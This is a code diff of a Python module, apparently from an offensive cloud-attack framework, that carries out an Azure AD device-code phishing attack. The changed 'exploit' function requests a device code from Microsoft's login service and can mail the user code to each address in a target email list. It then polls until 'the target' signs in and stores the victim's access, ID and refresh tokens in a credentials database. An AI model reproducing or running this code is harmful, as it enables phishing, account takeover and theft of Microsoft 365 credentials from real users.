@@ -66,7 +66,7 @@ global device_code_request_json
 description = ""
 aws_command = "No awscli command"
 
-def exploit(workspace):
+def exploit(callstoprofile):
     global device_code_request_json
     resource = variables['RESOURCE']['value']
     client_id = variables['CLIENT-ID']['value']
@@ -75,164 +75,169 @@ def exploit(workspace):
     refresh = variables['REFRESH']['value']
 
     scope = 'https://graph.microsoft.com/.default'
+    try:
+        if refresh.lower().strip().replace("\n","") == 'false':
+            try:
+                device_code_request = requests.post(
+                    "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
+                    data={
+                        "client_id": client_id,
+                        "resource": resource,
+                        "scope": scope
+                    }
+                )
 
-    if refresh.lower().strip().replace("\n","") == 'false':
-        try:
-            device_code_request = requests.post(
-                "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0",
+                if device_code_request.status_code == 200:
+                    if send_mail.lower().strip().replace("\n", "") == 'true':
+                        email_file = open(target_email_wordlist, 'r')
+
+                        for email in email_file.readlines():
+                            send_email(email.strip().replace("\n", ""), device_code_request.json()['user_code'])
+
+                    else:
+                        device_code_request_json = device_code_request.json()
+
+                        return {
+                            "client_id":{
+                                "message": device_code_request.json()['message'],
+                                "client_id": client_id,
+                                'instructions': "Run this module periodically with REFRESH set to True to get the tokens."
+                            }
+                        }, 200
+                else:
+                    return {"error": device_code_request.text}, 500
+
+            except Exception as e:
+                return {"error": str(e)}, 500
+
+        else:
+            device_code = device_code_request_json['device_code']
+
+            token_request = requests.post(
+                "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
                 data={
                     "client_id": client_id,
                     "resource": resource,
-                    "scope": scope
+                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                    "code": device_code
                 }
             )
 
-            if device_code_request.status_code == 200:
-                if send_mail.lower().strip().replace("\n", "") == 'true':
-                    email_file = open(target_email_wordlist, 'r')
+            if token_request.status_code == 400:
+                return {"device_code": {
+                            "message": "Still no authentication done by the target",
+                            "device_code": device_code
+                    }}
 
-                    for email in email_file.readlines():
-                        send_email(email.strip().replace("\n", ""), device_code_request.json()['user_code'])
+            elif token_request.status_code == 200:
+                me = {}
+                returned_request = token_request.json()
+                access_token = returned_request['access_token']
+                cred_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
 
-                else:
-                    device_code_request_json = device_code_request.json()
+                device_code_request_json = {}
 
+                try:
+                    #me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me",
+                    #                   headers={
+                    #                        'Content-Type': 'application/json',
+                    #                        'Authorization': 'Bearer {}'.format(access_token)
+                    #                   }).text
+                    #                )
+
+                    access_token_json = json.loads(base64.b64decode(access_token.split(".")[1]))
+
+
+                    database_dict = {
+                        "azure_user_id": access_token_json['oid'],
+                        "azure_creds_name": cred_id,
+                        "azure_user_principal_name": access_token_json['upn'],
+                        "azure_access_token": access_token,
+                        "azure_id_token": returned_request['id_token'],
+                        "azure_refresh_token": returned_request['refresh_token'],
+                        "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
+                        "azure_user_name": (access_token_json['upn']).split("@")[0],
+                        "azure_resource": resource,
+                        "azure_creds_scope": (returned_request['scope']).split(" ")
+                    }
+
+                    me = {
+                        "azure_user_id": access_token_json['oid'],
+                        "azure_user_principal_name": access_token_json['upn'],
+                        "azure_user_name": (access_token_json['upn']).split("@")[0],
+                        "azure_resource": resource,
+                        "azure_creds_name": cred_id
+                    }
+
+                    try:
+                        azure_user = AZURECredentials.objects.get(azure_creds_name=database_dict['azure_creds_name'])
+                        azure_user.modify(**database_dict)
+                        azure_user.save()
+
+                    except DoesNotExist:
+                        AZURECredentials(**database_dict).save()
+
+                    except Exception as e:
+                        if "AWSUsers matching query does not exist" in e:
+                            return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
+                        else:
+                            return {"error": "Error from module: {}".format(str(e))}, 500
+
+                except binascii.Error:
+                    access_token = (returned_request['access_token']).split(".")[1]
+                    access_token += "=" * ((4 - len(access_token) % 4) % 4)
+                    access_token_json = json.loads(base64.b64decode(access_token))
+
+                    database_dict = {
+                        "azure_user_id": access_token_json['oid'],
+                        "azure_creds_name": cred_id,
+                        "azure_user_principal_name": access_token_json['upn'],
+                        "azure_access_token": returned_request['access_token'],
+                        "azure_id_token": returned_request['id_token'],
+                        "azure_refresh_token": returned_request['refresh_token'],
+                        "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
+                        "azure_user_name": (access_token_json['upn']).split("@")[0],
+                        "azure_resource": resource,
+                        "azure_creds_scope": (returned_request['scope']).split(" ")
+                    }
+
+                    me = {
+                        "azure_user_id": access_token_json['oid'],
+                        "azure_user_principal_name": access_token_json['upn'],
+                        "azure_user_name": (access_token_json['upn']).split("@")[0],
+                        "azure_resource": resource,
+                        "azure_creds_name": cred_id
+                    }
+
+
+                    try:
+                        azure_user = AZURECredentials.objects.get(
+                            azure_creds_name=database_dict['azure_creds_name'])
+                        azure_user.modify(**database_dict)
+                        azure_user.save()
+
+                    except DoesNotExist:
+                        AZURECredentials(**database_dict).save()
+
+                    except Exception as e:
+                        if "AWSUsers matching query does not exist" in e:
+                            return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
+                        else:
+                            return {"error": "Error from module: {}".format(str(e))}, 500
+
+                except Exception as e:
                     return {
-                        "client_id":{
-                            "message": device_code_request.json()['message'],
-                            "client_id": client_id,
-                            'instructions': "Run this module periodically with REFRESH set to True to get the tokens."
-                        }
-                    }, 200
-            else:
-                return {"error": str(e)}, 500
+                        "error": "No Privs to check user's info"
+                    }
 
-        except Exception as e:
-            return {"error": str(e)}, 500
-
-    else:
-        device_code = device_code_request_json['device_code']
-
-        token_request = requests.post(
-            "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0",
-            data={
-                "client_id": client_id,
-                "resource": resource,
-                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-                "code": device_code
-            }
-        )
-
-        if token_request.status_code == 400:
-            return {"device_code": {
-                        "message": "Still no authentication done by the target",
-                        "device_code": device_code
-                }}
-
-        elif token_request.status_code == 200:
-            me = {}
-            returned_request = token_request.json()
-            access_token = returned_request['access_token']
-            cred_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
-
-            device_code_request_json = {}
-
-            try:
-                #me = json.loads(requests.get("https://graph.microsoft.com/v1.0/me",
-                #                   headers={
-                #                        'Content-Type': 'application/json',
-                #                        'Authorization': 'Bearer {}'.format(access_token)
-                #                   }).text
-                #                )
-
-                access_token_json = json.loads(base64.b64decode(access_token.split(".")[1]))
-
-
-                database_dict = {
-                    "azure_user_id": access_token_json['oid'],
-                    "azure_creds_name": cred_id,
-                    "azure_user_principal_name": access_token_json['upn'],
-                    "azure_access_token": access_token,
-                    "azure_id_token": returned_request['id_token'],
-                    "azure_refresh_token": returned_request['refresh_token'],
-                    "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
-                    "azure_user_name": (access_token_json['upn']).split("@")[0],
-                    "azure_resource": resource,
-                    "azure_creds_scope": (returned_request['scope']).split(" ")
-                }
-
-                me = {
-                    "azure_user_id": access_token_json['oid'],
-                    "azure_user_principal_name": access_token_json['upn'],
-                    "azure_user_name": (access_token_json['upn']).split("@")[0],
-                    "azure_resource": resource,
-                    "azure_creds_name": cred_id
-                }
-
-                try:
-                    azure_user = AZURECredentials.objects.get(azure_creds_name=database_dict['azure_creds_name'])
-                    azure_user.modify(**database_dict)
-                    azure_user.save()
-
-                except DoesNotExist:
-                    AZURECredentials(**database_dict).save()
-
-                except Exception as e:
-                    if "AWSUsers matching query does not exist" in e:
-                        return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
-                    else:
-                        return {"error": "Error from module: {}".format(str(e))}, 500
-
-            except binascii.Error:
-                access_token = (returned_request['access_token']).split(".")[1]
-                access_token += "=" * ((4 - len(access_token) % 4) % 4)
-                access_token_json = json.loads(base64.b64decode(access_token))
-
-                database_dict = {
-                    "azure_user_id": access_token_json['oid'],
-                    "azure_creds_name": cred_id,
-                    "azure_user_principal_name": access_token_json['upn'],
-                    "azure_access_token": returned_request['access_token'],
-                    "azure_id_token": returned_request['id_token'],
-                    "azure_refresh_token": returned_request['refresh_token'],
-                    "azure_expiration_date": datetime.datetime.fromtimestamp(int(returned_request['expires_on'])).isoformat(),
-                    "azure_user_name": (access_token_json['upn']).split("@")[0],
-                    "azure_resource": resource,
-                    "azure_creds_scope": (returned_request['scope']).split(" ")
-                }
-
-                me = {
-                    "azure_user_id": access_token_json['oid'],
-                    "azure_user_principal_name": access_token_json['upn'],
-                    "azure_user_name": (access_token_json['upn']).split("@")[0],
-                    "azure_resource": resource,
-                    "azure_creds_name": cred_id
-                }
-
-
-                try:
-                    azure_user = AZURECredentials.objects.get(
-                        azure_creds_name=database_dict['azure_creds_name'])
-                    azure_user.modify(**database_dict)
-                    azure_user.save()
-
-                except DoesNotExist:
-                    AZURECredentials(**database_dict).save()
-
-                except Exception as e:
-                    if "AWSUsers matching query does not exist" in e:
-                        return {"error": "AWSUsers matching query does not exist".format(str(e))}, 500
-                    else:
-                        return {"error": "Error from module: {}".format(str(e))}, 500
-
-            except Exception as e:
                 return {
-                    "error": "No Privs to check user's info"
-                }
+                        "azure_creds_name": me
+                    }
+            else:
+                return {"error": "Error from module: {}".format(str(token_request.text))}, 500
 
-            return {
-                    "azure_creds_name": me
-                }
+    except Exception as e:
+        return {"error": "Error from module: {}".format(str(e))}, 500
 
 def send_email(email, device_code):
     print(email, device_code)
